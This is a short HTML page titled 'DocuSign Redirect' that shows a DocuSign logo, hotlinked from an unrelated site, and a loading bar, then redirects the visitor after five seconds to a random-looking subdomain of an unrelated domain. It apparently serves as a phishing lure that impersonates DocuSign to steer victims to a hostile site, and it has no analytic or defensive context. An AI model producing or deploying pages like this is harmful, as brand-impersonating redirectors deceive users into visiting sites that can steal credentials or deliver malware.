<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign Redirect</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }
        .container {
            text-align: center;
        }
        .logo {
            width: 200px;
        }
        .loading-bar {
            width: 100%;
            height: 10px;
            background-color: #d3d3d3;
            margin-top: 20px;
            overflow: hidden;
            position: relative;
        }
        .loading-bar::before {
            content: '';
            display: block;
            position: absolute;
            left: 0;
            height: 100%;
            width: 0;
            background-color: #0078d4; /* Microsoft Word blue */
            animation: loading 5s linear forwards;
        }
        @keyframes loading {
            100% {
                width: 100%;
            }
        }
    </style>
    <script>
        function redirect() {
            setTimeout(function() {
                window.location.href = "https://VfSRw.lionich.com/MCz30/";
            }, 5000);
        }
    </script>
</head>
<body onload="redirect()">
    <div class="container">
        <img src="https://infinicept.com/payment-facilitator/wp-content/uploads/2016/10/docusign_logo_3c.png" alt="DocuSign Logo" class="logo">
        <div class="loading-bar"></div>
    </div>
</body>
</html>
